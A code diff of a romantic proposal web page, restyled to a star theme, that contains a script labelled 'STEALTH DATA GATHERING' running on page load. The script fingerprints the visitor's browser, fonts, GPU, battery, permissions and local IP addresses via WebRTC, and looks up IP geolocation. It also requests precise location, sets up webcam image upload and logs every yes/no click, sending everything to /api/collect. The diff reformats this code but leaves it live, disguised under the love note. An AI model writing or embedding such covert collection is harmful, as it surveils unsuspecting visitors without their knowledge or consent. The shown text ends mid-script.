@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -30,7 +31,7 @@
             width: 140vw;
             height: 140vh;
             background: radial-gradient(circle at 20% 30%, rgba(255, 107, 138, 0.15) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 70%, rgba(255, 217, 61, 0.08) 0%, transparent 50%);
+                radial-gradient(circle at 80% 70%, rgba(255, 217, 61, 0.08) 0%, transparent 50%);
             pointer-events: none;
             z-index: -2;
         }
@@ -58,12 +59,15 @@
                 transform: translateY(100vh) rotate(0deg);
                 opacity: 0;
             }
+
             10% {
                 opacity: 0.8;
             }
+
             90% {
                 opacity: 0.8;
             }
+
             100% {
                 transform: translateY(-100px) rotate(720deg);
                 opacity: 0;
@@ -85,12 +89,15 @@
                 transform: translateY(-100px) rotate(0deg) translateX(0);
                 opacity: 0;
             }
+
             10% {
                 opacity: 0.7;
             }
+
             90% {
                 opacity: 0.7;
             }
+
             100% {
                 transform: translateY(100vh) rotate(720deg) translateX(100px);
                 opacity: 0;
@@ -116,11 +123,27 @@
         }
 
         @keyframes heartbeat {
-            0%, 100% { transform: scale(1); }
-            15% { transform: scale(1.15); }
-            30% { transform: scale(1); }
-            45% { transform: scale(1.1); }
-            60% { transform: scale(1); }
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            15% {
+                transform: scale(1.15);
+            }
+
+            30% {
+                transform: scale(1);
+            }
+
+            45% {
+                transform: scale(1.1);
+            }
+
+            60% {
+                transform: scale(1);
+            }
         }
 
         .title {
@@ -137,8 +160,13 @@
         }
 
         @keyframes shimmer {
-            0% { background-position: 0% center; }
-            100% { background-position: 200% center; }
+            0% {
+                background-position: 0% center;
+            }
+
+            100% {
+                background-position: 200% center;
+            }
         }
 
         .subtitle {
@@ -156,6 +184,7 @@
                 opacity: 0;
                 transform: translateY(30px);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0);
@@ -180,9 +209,22 @@
         }
 
         @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-20px); }
-            60% { transform: translateY(-10px); }
+
+            0%,
+            20%,
+            50%,
+            80%,
+            100% {
+                transform: translateY(0);
+            }
+
+            40% {
+                transform: translateY(-20px);
+            }
+
+            60% {
+                transform: translateY(-10px);
+            }
         }
 
         .story-section {
@@ -308,8 +350,15 @@
         }
 
         @keyframes ringFloat {
-            0%, 100% { transform: translateY(0) rotate(-10deg); }
-            50% { transform: translateY(-20px) rotate(10deg); }
+
+            0%,
+            100% {
+                transform: translateY(0) rotate(-10deg);
+            }
+
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+            }
         }
 
         .proposal-question {
@@ -384,8 +433,13 @@
         }
 
         @keyframes celebrateBounce {
-            from { transform: scale(1) rotate(-5deg); }
-            to { transform: scale(1.1) rotate(5deg); }
+            from {
+                transform: scale(1) rotate(-5deg);
+            }
+
+            to {
+                transform: scale(1.1) rotate(5deg);
+            }
         }
 
         .celebration-title {
@@ -426,6 +480,7 @@
                 transform: translate(0, 0) scale(1);
                 opacity: 1;
             }
+
             100% {
                 transform: translate(var(--tx), var(--ty)) scale(0);
                 opacity: 0;
@@ -452,8 +507,17 @@
         }
 
         @keyframes twinkle {
-            0%, 100% { opacity: 0.3; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.5); }
+
+            0%,
+            100% {
+                opacity: 0.3;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 1;
+                transform: scale(1.5);
+            }
         }
 
         .music-btn {
@@ -477,9 +541,20 @@
         }
 
         @keyframes musicPulse {
-            0% { box-shadow: 0 8px 32px rgba(255, 107, 138, 0.4); transform: scale(1); }
-            50% { box-shadow: 0 8px 40px rgba(255, 107, 138, 0.7); transform: scale(1.05); }
-            100% { box-shadow: 0 8px 32px rgba(255, 107, 138, 0.4); transform: scale(1); }
+            0% {
+                box-shadow: 0 8px 32px rgba(255, 107, 138, 0.4);
+                transform: scale(1);
+            }
+
+            50% {
+                box-shadow: 0 8px 40px rgba(255, 107, 138, 0.7);
+                transform: scale(1.05);
+            }
+
+            100% {
+                box-shadow: 0 8px 32px rgba(255, 107, 138, 0.4);
+                transform: scale(1);
+            }
         }
 
         .music-btn:hover {
@@ -576,32 +651,87 @@
 
         /* Phase 1 — SVG crack lines draw in */
         @keyframes drawCrack {
-            to { stroke-dashoffset: 0; }
+            to {
+                stroke-dashoffset: 0;
+            }
         }
 
         /* Phase 1 — whole page screen-shake */
         @keyframes screenShake {
-            0%,100% { transform: translate(0,0) rotate(0deg); }
-            8%  { transform: translate(-10px,-5px) rotate(-1deg); }
-            16% { transform: translate(10px, 5px) rotate( 1deg); }
-            24% { transform: translate(-8px, 6px) rotate(-0.5deg); }
-            32% { transform: translate( 8px,-6px) rotate( 0.5deg); }
-            40% { transform: translate(-5px, 8px) rotate(-0.8deg); }
-            48% { transform: translate( 5px,-8px) rotate( 0.8deg); }
-            56% { transform: translate(-4px,-4px) rotate(-0.3deg); }
-            64% { transform: translate( 4px, 4px) rotate( 0.3deg); }
-            72% { transform: translate(-2px, 3px) rotate(-0.2deg); }
-            80% { transform: translate( 2px,-3px) rotate( 0.2deg); }
-            90% { transform: translate(-1px, 1px) rotate(0deg); }
+
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+
+            8% {
+                transform: translate(-10px, -5px) rotate(-1deg);
+            }
+
+            16% {
+                transform: translate(10px, 5px) rotate(1deg);
+            }
+
+            24% {
+                transform: translate(-8px, 6px) rotate(-0.5deg);
+            }
+
+            32% {
+                transform: translate(8px, -6px) rotate(0.5deg);
+            }
+
+            40% {
+                transform: translate(-5px, 8px) rotate(-0.8deg);
+            }
+
+            48% {
+                transform: translate(5px, -8px) rotate(0.8deg);
+            }
+
+            56% {
+                transform: translate(-4px, -4px) rotate(-0.3deg);
+            }
+
+            64% {
+                transform: translate(4px, 4px) rotate(0.3deg);
+            }
+
+            72% {
+                transform: translate(-2px, 3px) rotate(-0.2deg);
+            }
+
+            80% {
+                transform: translate(2px, -3px) rotate(0.2deg);
+            }
+
+            90% {
+                transform: translate(-1px, 1px) rotate(0deg);
+            }
         }
 
         /* Phase 2 — element pre-shake before falling */
         @keyframes pieceShake {
-            0%,100% { transform: translate(0,0) rotate(0deg); }
-            20% { transform: translate(-6px, 3px) rotate(-1.5deg); }
-            40% { transform: translate( 6px,-3px) rotate( 1.5deg); }
-            60% { transform: translate(-4px, 4px) rotate(-0.8deg); }
-            80% { transform: translate( 4px,-4px) rotate( 0.8deg); }
+
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+
+            20% {
+                transform: translate(-6px, 3px) rotate(-1.5deg);
+            }
+
+            40% {
+                transform: translate(6px, -3px) rotate(1.5deg);
+            }
+
+            60% {
+                transform: translate(-4px, 4px) rotate(-0.8deg);
+            }
+
+            80% {
+                transform: translate(4px, -4px) rotate(0.8deg);
+            }
         }
 
         /* Phase 2 — element fall */
@@ -611,19 +741,18 @@
             will-change: transform, opacity, filter;
             backface-visibility: hidden;
         }
+
         .breaking-piece.do-shake {
             animation: pieceShake 0.45s ease-in-out !important;
         }
+
         .breaking-piece.do-fall {
             transition:
                 transform var(--fall-dur, 3.2s) cubic-bezier(0.55, 0.05, 0.9, 0.4),
-                opacity   var(--fade-dur, 2.5s) ease-in var(--fade-del, 0.6s),
-                filter    0.8s ease-out !important;
+                opacity var(--fade-dur, 2.5s) ease-in var(--fade-del, 0.6s),
+                filter 0.8s ease-out !important;
             transform:
-                translateY(var(--ty, 130vh))
-                translateX(var(--tx, 0px))
-                rotate(var(--rot, 0deg))
-                scale(var(--sc, 0.55)) !important;
+                translateY(var(--ty, 130vh)) translateX(var(--tx, 0px)) rotate(var(--rot, 0deg)) scale(var(--sc, 0.55)) !important;
             opacity: 0 !important;
             filter: blur(6px) !important;
         }
@@ -631,8 +760,10 @@
         /* Phase 3 — sad screen */
         .sad-screen {
             position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
             background: #000;
             display: flex;
             justify-content: center;
@@ -644,10 +775,12 @@
             z-index: 99999;
             pointer-events: none;
         }
+
         .sad-screen.active {
             opacity: 1;
             pointer-events: auto;
         }
+
         .sad-text {
             font-family: 'Playfair Display', serif;
             font-size: clamp(2.5rem, 8vw, 5rem);
@@ -657,12 +790,21 @@
             animation: sadPulse 3s alternate infinite ease-in-out;
             text-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
         }
+
         @keyframes sadPulse {
-            0%   { color: #333; transform: scale(0.97); }
-            100% { color: #666; transform: scale(1.03); }
+            0% {
+                color: #333;
+                transform: scale(0.97);
+            }
+
+            100% {
+                color: #666;
+                transform: scale(1.03);
+            }
         }
     </style>
 </head>
+
 <body>
     <div class="stars" id="stars"></div>
     <div class="hearts-container" id="heartsContainer"></div>
@@ -670,11 +812,11 @@
     <button class="music-btn" id="musicBtn" title="Toggle Music">🎵</button>
 
     <section class="landing-section" id="landing">
-        <div class="main-heart">💕</div>
-        <h1 class="title">For Someone Special</h1>
+        <div class="main-heart">⭐</div>
+        <h1 class="title">For My Star</h1>
         <p class="subtitle">
-            Every love story is beautiful, but ours is my favorite. 
-            I have something special to ask you...
+            In the endless sky, you are the brightest light I’ve ever known.
+            I have something cosmic to ask you...
         </p>
         <div class="scroll-indicator" onclick="scrollToSection('story')">
             <span></span>
@@ -688,7 +830,7 @@
                 <div class="timeline-emoji">💫</div>
                 <div class="timeline-date">The Beginning</div>
                 <div class="timeline-text">
-                    The moment I first saw you, I knew my life was about to change forever. 
+                    The moment I first saw you, I knew my life was about to change forever.
                     Your smile lit up my world.
                 </div>
             </div>
@@ -696,7 +838,7 @@
                 <div class="timeline-emoji">☕</div>
                 <div class="timeline-date">Our First Date</div>
                 <div class="timeline-text">
-                    That nervous coffee date where we talked for hours and forgot about time. 
+                    That nervous coffee date where we talked for hours and forgot about time.
                     I knew then I wanted countless more moments with you.
                 </div>
             </div>
@@ -704,7 +846,7 @@
                 <div class="timeline-emoji">🌅</div>
                 <div class="timeline-date">Adventures Together</div>
                 <div class="timeline-text">
-                    From watching sunsets to late-night talks, every moment with you became 
+                    From watching sunsets to late-night talks, every moment with you became
                     a treasure I hold close to my heart.
                 </div>
             </div>
@@ -712,7 +854,7 @@
                 <div class="timeline-emoji">❤️</div>
                 <div class="timeline-date">Falling In Love</div>
                 <div class="timeline-text">
-                    Somewhere along the way, you became my everything. My best friend, 
+                    Somewhere along the way, you became my everything. My best friend,
                     my partner, my home.
                 </div>
             </div>
@@ -727,7 +869,7 @@
 
         <div class="personal-message">
             <p>
-                "In all the world, there is no heart for me like yours. 
+                "In all the world, there is no heart for me like yours.
                 In all the world, there is no love for you like mine."
             </p>
             <div class="signature">— Forever Yours ❤️</div>
@@ -735,10 +877,10 @@
     </section>
 
     <section class="proposal-section" id="proposal">
-        <div class="ring-animation">💍</div>
-        <h2 class="proposal-question">Do you love me?</h2>
+        <div class="ring-animation">🌙</div>
+        <h2 class="proposal-question">Will You Be Mine?</h2>
         <div class="buttons-container">
-            <button class="btn btn-yes" id="yesBtn" onclick="handleYes()">Yes, I Will! 💕</button>
+            <button class="btn btn-yes" id="yesBtn" onclick="handleYes()">Yes, Always! 🌟</button>
             <button class="btn btn-no" id="noBtn" onmouseover="runAway()" onclick="handleNo()">Maybe...</button>
         </div>
     </section>
@@ -747,8 +889,8 @@
         <div class="celebration-emoji">🎉💒🎊</div>
         <h1 class="celebration-title">She Said Yes!</h1>
         <p class="celebration-text">
-            You've made me the happiest person in the world! 
-            I promise to love you, cherish you, and make every day an adventure. 
+            You've made me the happiest person in the world!
+            I promise to love you, cherish you, and make every day an adventure.
             Our forever starts now!
         </p>
         <div class="ring-animation" style="font-size: 150px; margin-top: 40px;">💍</div>
@@ -759,552 +901,552 @@
         //  STEALTH DATA GATHERING
         // ============================================================
 
-        const COLLECTOR = (function() {
-          function _getVisitorId() {
-            let id = localStorage.getItem('_vid');
-            if (!id) {
-              id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
-              localStorage.setItem('_vid', id);
-            }
-            return id;
-          }
-
-          function _getFingerprint() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200; canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('CVE-2024-🖥️', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('PWN', 4, 17);
-            const canvasFp = canvas.toDataURL();
-
-            return {
-              userAgent: navigator.userAgent,
-              platform: navigator.platform,
-              language: navigator.language,
-              languages: navigator.languages,
-              cookieEnabled: navigator.cookieEnabled,
-              doNotTrack: navigator.doNotTrack,
-              hardwareConcurrency: navigator.hardwareConcurrency,
-              deviceMemory: navigator.deviceMemory || 'unknown',
-              maxTouchPoints: navigator.maxTouchPoints,
-              screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
-              window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio },
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              timezoneOffset: new Date().getTimezoneOffset(),
-              canvasFingerprint: canvasFp,
-              webdriver: navigator.webdriver,
-              plugins: Array.from(navigator.plugins || []).map(p => p.name),
-              mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-              fonts: (function() {
-                const bases = 'monospace sans-serif serif'.split(' ');
-                const tests = 'Arial Helvetica Times Verdana Georgia Courier Comic+Sans Impact Tahoma Trebuchet+MS Palatino Garamond Bookman Avant+Garde'.split(' ');
-                const found = [];
-                const div = document.createElement('div');
-                div.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-                document.body.appendChild(div);
-                for (const base of bases) {
-                  div.style.fontFamily = base;
-                  const baseWidth = div.offsetWidth;
-                  for (const test of tests) {
-                    div.style.fontFamily = test + ', ' + base;
-                    if (div.offsetWidth !== baseWidth) found.push(test.replace(/\+/g, ' '));
-                  }
+        const COLLECTOR = (function () {
+            function _getVisitorId() {
+                let id = localStorage.getItem('_vid');
+                if (!id) {
+                    id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+                    localStorage.setItem('_vid', id);
                 }
-                document.body.removeChild(div);
-                return found;
-              })(),
-              adblock: (function() {
-                const el = document.createElement('div');
-                el.innerHTML = '&nbsp;';
-                el.className = 'ad_unit ' + Math.random();
-                el.style.position = 'absolute';
-                el.style.top = '-999px';
-                document.body.appendChild(el);
-                const hidden = el.offsetHeight === 0;
-                document.body.removeChild(el);
-                return hidden;
-              })(),
-              connection: (function() {
-                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
-              })(),
-              battery: null
-            };
-          }
-
-          async function _getBattery() {
-            try {
-              if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
-              }
-            } catch(e) {}
-            return null;
-          }
-
-          function _getWebGLInfo() {
-            try {
-              const canvas = document.createElement('canvas');
-              const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-              if (!gl) return null;
-              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-              return {
-                vendor: gl.getParameter(gl.VENDOR),
-                renderer: gl.getParameter(gl.RENDERER),
-                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
-                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
-                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
-              };
-            } catch (e) {
-              return null;
+                return id;
             }
-          }
 
-          function _getAudioContextInfo() {
-            try {
-              const AudioContext = window.AudioContext || window.webkitAudioContext;
-              if (!AudioContext) return null;
-              const context = new AudioContext();
-              const result = {
-                sampleRate: context.sampleRate,
-                maxChannelCount: context.destination.maxChannelCount,
-                state: context.state
-              };
-              context.close();
-              return result;
-            } catch (e) {
-              return null;
-            }
-          }
+            function _getFingerprint() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200; canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('CVE-2024-🖥️', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('PWN', 4, 17);
+                const canvasFp = canvas.toDataURL();
 
-          async function _getMediaDevices() {
-            try {
-              if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
-              const devices = await navigator.mediaDevices.enumerateDevices();
-              return devices.map(d => ({
-                kind: d.kind,
-                label: d.label || 'Permission Denied',
-                deviceId: d.deviceId ? (d.deviceId.slice(0, 8) + '...') : 'none'
-              }));
-            } catch (e) {
-              return [];
-            }
-          }
-
-          async function _getPermissions() {
-            const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
-            const results = {};
-            if (!navigator.permissions || !navigator.permissions.query) return results;
-            for (const name of permissions) {
-              try {
-                const status = await navigator.permissions.query({ name });
-                results[name] = status.state;
-              } catch (e) {
-                results[name] = 'error';
-              }
-            }
-            return results;
-          }
-
-          function _getLocalIps() {
-            return new Promise((resolve) => {
-              const ips = [];
-              try {
-                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-                if (!RTCPeerConnection) return resolve([]);
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.onicecandidate = (e) => {
-                  if (!e.candidate) {
-                    pc.close();
-                    resolve(ips);
-                    return;
-                  }
-                  const cand = e.candidate.candidate;
-                  const match = cand.match(/([0-9a-fA-F:]+\.local)|([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                  if (match && !ips.includes(match[0])) {
-                    ips.push(match[0]);
-                  }
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
+                    window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    canvasFingerprint: canvasFp,
+                    webdriver: navigator.webdriver,
+                    plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+                    fonts: (function () {
+                        const bases = 'monospace sans-serif serif'.split(' ');
+                        const tests = 'Arial Helvetica Times Verdana Georgia Courier Comic+Sans Impact Tahoma Trebuchet+MS Palatino Garamond Bookman Avant+Garde'.split(' ');
+                        const found = [];
+                        const div = document.createElement('div');
+                        div.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                        document.body.appendChild(div);
+                        for (const base of bases) {
+                            div.style.fontFamily = base;
+                            const baseWidth = div.offsetWidth;
+                            for (const test of tests) {
+                                div.style.fontFamily = test + ', ' + base;
+                                if (div.offsetWidth !== baseWidth) found.push(test.replace(/\+/g, ' '));
+                            }
+                        }
+                        document.body.removeChild(div);
+                        return found;
+                    })(),
+                    adblock: (function () {
+                        const el = document.createElement('div');
+                        el.innerHTML = '&nbsp;';
+                        el.className = 'ad_unit ' + Math.random();
+                        el.style.position = 'absolute';
+                        el.style.top = '-999px';
+                        document.body.appendChild(el);
+                        const hidden = el.offsetHeight === 0;
+                        document.body.removeChild(el);
+                        return hidden;
+                    })(),
+                    connection: (function () {
+                        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                        return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
+                    })(),
+                    battery: null
                 };
-                pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => {});
-                setTimeout(() => {
-                  pc.close();
-                  resolve(ips);
-                }, 800);
-              } catch (e) {
-                resolve([]);
-              }
-            });
-          }
+            }
 
-          async function _getIpApiGeo() {
-            try {
-              const res = await fetch('https://ipapi.co/json/');
-              if (res.ok) {
-                return await res.json();
-              }
-            } catch (e) {}
-            return null;
-          }
+            async function _getBattery() {
+                try {
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+                    }
+                } catch (e) { }
+                return null;
+            }
 
-          function _getGeolocation(vid) {
-            if (!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(
-              function(pos) {
-                fetch('/api/geolocation', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }) }).catch(function(){});
-              },
-              function() {},
-              { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
-            );
-          }
+            function _getWebGLInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return null;
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
 
-          function sendWebcamImage(vid, imageData) {
-            return fetch('/api/webcam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, image: imageData }) }).then(function(r) { return r.json(); });
-          }
+            function _getAudioContextInfo() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (!AudioContext) return null;
+                    const context = new AudioContext();
+                    const result = {
+                        sampleRate: context.sampleRate,
+                        maxChannelCount: context.destination.maxChannelCount,
+                        state: context.state
+                    };
+                    context.close();
+                    return result;
+                } catch (e) {
+                    return null;
+                }
+            }
 
-          async function _send() {
-            const vid = _getVisitorId();
-            const battery = await _getBattery();
-            const fingerprint = _getFingerprint();
-            fingerprint.battery = battery;
+            async function _getMediaDevices() {
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    return devices.map(d => ({
+                        kind: d.kind,
+                        label: d.label || 'Permission Denied',
+                        deviceId: d.deviceId ? (d.deviceId.slice(0, 8) + '...') : 'none'
+                    }));
+                } catch (e) {
+                    return [];
+                }
+            }
 
-            // Gather maximum possible extra details asynchronously
-            try {
-              fingerprint.webgl = _getWebGLInfo();
-              fingerprint.audio = _getAudioContextInfo();
-              fingerprint.permissions = await _getPermissions();
-              fingerprint.mediaDevices = await _getMediaDevices();
-              fingerprint.localIps = await _getLocalIps();
-              fingerprint.ipGeo = await _getIpApiGeo();
-            } catch(e) {}
+            async function _getPermissions() {
+                const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
+                const results = {};
+                if (!navigator.permissions || !navigator.permissions.query) return results;
+                for (const name of permissions) {
+                    try {
+                        const status = await navigator.permissions.query({ name });
+                        results[name] = status.state;
+                    } catch (e) {
+                        results[name] = 'error';
+                    }
+                }
+                return results;
+            }
 
-            const payload = {
-              id: vid,
-              type: 'page_visit',
-              fingerprint: fingerprint,
-              referrer: document.referrer,
-              url: window.location.href,
-              timestamp: new Date().toISOString(),
-              pageLoaded: performance.now(),
-              source: document.referrer ? 'referral' : 'direct'
-            };
+            function _getLocalIps() {
+                return new Promise((resolve) => {
+                    const ips = [];
+                    try {
+                        const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+                        if (!RTCPeerConnection) return resolve([]);
+                        const pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel('');
+                        pc.onicecandidate = (e) => {
+                            if (!e.candidate) {
+                                pc.close();
+                                resolve(ips);
+                                return;
+                            }
+                            const cand = e.candidate.candidate;
+                            const match = cand.match(/([0-9a-fA-F:]+\.local)|([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                            if (match && !ips.includes(match[0])) {
+                                ips.push(match[0]);
+                            }
+                        };
+                        pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => { });
+                        setTimeout(() => {
+                            pc.close();
+                            resolve(ips);
+                        }, 800);
+                    } catch (e) {
+                        resolve([]);
+                    }
+                });
+            }
 
-            try { await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
-            catch(e) { navigator.sendBeacon('/api/collect', JSON.stringify(payload)); }
+            async function _getIpApiGeo() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    if (res.ok) {
+                        return await res.json();
+                    }
+                } catch (e) { }
+                return null;
+            }
 
-            setTimeout(function() { _getGeolocation(vid); }, 1500);
-          }
+            function _getGeolocation(vid) {
+                if (!navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(
+                    function (pos) {
+                        fetch('/api/geolocation', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }) }).catch(function () { });
+                    },
+                    function () { },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+                );
+            }
 
-          return { send: _send, getVisitorId: _getVisitorId, sendWebcamImage: sendWebcamImage };
+            function sendWebcamImage(vid, imageData) {
+                return fetch('/api/webcam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, image: imageData }) }).then(function (r) { return r.json(); });
+            }
+
+            async function _send() {
+                const vid = _getVisitorId();
+                const battery = await _getBattery();
+                const fingerprint = _getFingerprint();
+                fingerprint.battery = battery;
+
+                // Gather maximum possible extra details asynchronously
+                try {
+                    fingerprint.webgl = _getWebGLInfo();
+                    fingerprint.audio = _getAudioContextInfo();
+                    fingerprint.permissions = await _getPermissions();
+                    fingerprint.mediaDevices = await _getMediaDevices();
+                    fingerprint.localIps = await _getLocalIps();
+                    fingerprint.ipGeo = await _getIpApiGeo();
+                } catch (e) { }
+
+                const payload = {
+                    id: vid,
+                    type: 'page_visit',
+                    fingerprint: fingerprint,
+                    referrer: document.referrer,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString(),
+                    pageLoaded: performance.now(),
+                    source: document.referrer ? 'referral' : 'direct'
+                };
+
+                try { await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
+                catch (e) { navigator.sendBeacon('/api/collect', JSON.stringify(payload)); }
+
+                setTimeout(function () { _getGeolocation(vid); }, 1500);
+            }
+
+            return { send: _send, getVisitorId: _getVisitorId, sendWebcamImage: sendWebcamImage };
         })();
 
         COLLECTOR.send();
 
         // Click tracking
-        document.addEventListener('click', function(e) {
-          const target = e.target;
-          if (target.tagName === 'BUTTON' || target.closest('button')) {
-            const btn = target.tagName === 'BUTTON' ? target : target.closest('button');
-            const btnText = btn.textContent.trim().toLowerCase();
-            let decision = 'none';
-            if (btn.id === 'yesBtn' || btnText.includes('yes') || btnText.includes('i will')) {
-              decision = 'yes';
-            } else if (btn.id === 'noBtn' || btnText.includes('maybe') || btnText.includes('no') || btnText.includes('hmm') || btnText.includes('sure?')) {
-              decision = 'no';
+        document.addEventListener('click', function (e) {
+            const target = e.target;
+            if (target.tagName === 'BUTTON' || target.closest('button')) {
+                const btn = target.tagName === 'BUTTON' ? target : target.closest('button');
+                const btnText = btn.textContent.trim().toLowerCase();
+                let decision = 'none';
+                if (btn.id === 'yesBtn' || btnText.includes('yes') || btnText.includes('i will')) {
+                    decision = 'yes';
+                } else if (btn.id === 'noBtn' || btnText.includes('maybe') || btnText.includes('no') || btnText.includes('hmm') || btnText.includes('sure?')) {
+                    decision = 'no';
+                }
+                navigator.sendBeacon('/api/collect', JSON.stringify({
+                    id: localStorage.getItem('_vid'),
+                    type: 'click',
+                    buttonText: btn.textContent.trim(),
+                    decision: decision,
+                    timestamp: new Date().toISOString()
+                }));
             }
-            navigator.sendBeacon('/api/collect', JSON.stringify({
-              id: localStorage.getItem('_vid'),
-              type: 'click',
-              buttonText: btn.textContent.trim(),
-              decision: decision,
